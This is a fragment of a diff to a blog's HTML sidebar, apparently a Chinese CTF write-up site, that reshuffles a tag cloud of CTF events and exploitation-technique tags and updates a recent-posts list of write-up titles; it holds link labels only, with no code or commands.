-			<li><a href="/tags/nodejs/">nodejs<span>1</span></a></li>
-		
-			<li><a href="/tags/fmt-str/">fmt_str<span>2</span></a></li>
+			<li><a href="/tags/网鼎杯2018/">网鼎杯2018<span>1</span></a></li>
 		
 			<li><a href="/tags/XCTFQuals2016/">XCTFQuals2016<span>1</span></a></li>
 		
-			<li><a href="/tags/原型链污染/">原型链污染<span>1</span></a></li>
+			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
 		
-			<li><a href="/tags/无字母命令执行/">无字母命令执行<span>1</span></a></li>
+			<li><a href="/tags/Spring/">Spring<span>1</span></a></li>
 		
-			<li><a href="/tags/LitCTF2023/">LitCTF2023<span>2</span></a></li>
+			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
 		
-			<li><a href="/tags/NSSCTF2022/">NSSCTF2022<span>1</span></a></li>
+			<li><a href="/tags/ZJCTF2019/">ZJCTF2019<span>1</span></a></li>
 		
-			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
+			<li><a href="/tags/QEMU/">QEMU<span>1</span></a></li>
 		
-			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
+			<li><a href="/tags/ret2libc/">ret2libc<span>2</span></a></li>
 		
-			<li><a href="/tags/dcquals2019/">dcquals2019<span>1</span></a></li>
+			<li><a href="/tags/xss/">xss<span>1</span></a></li>
+		
+			<li><a href="/tags/nightmare/">nightmare<span>11</span></a></li>
 		
 			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
 		
-			<li><a href="/tags/stack-overflow/">stack_overflow<span>1</span></a></li>
+			<li><a href="/tags/Hacklu2015/">Hacklu2015<span>1</span></a></li>
+		
+			<li><a href="/tags/ROP/">ROP<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>120</span></a></li>
@@ -847,6 +1162,10 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/12/28/HGAME2023-SharedDiary-wp/" ><i class="fa fa-file-o"></i>HGAME2023-SharedDiary-wp</a>
+      </li>
+    
+      <li>
         <a href="/2023/12/25/ejs原型链污染RCE/" ><i class="fa fa-file-o"></i>ejs原型链污染RCE</a>
       </li>
     
@@ -860,10 +1179,6 @@
     
       <li>
         <a href="/2023/12/10/JAVA反序列化CC6/" ><i class="fa fa-file-o"></i>JAVA反序列化CC6</a>
-      </li>
-    
-      <li>
-        <a href="/2023/12/10/HNCTF2023-BabyJxVx-wp/" ><i class="fa fa-file-o"></i>HNCTF2023-BabyJxVx-wp</a>
       </li>
     
   </ul>
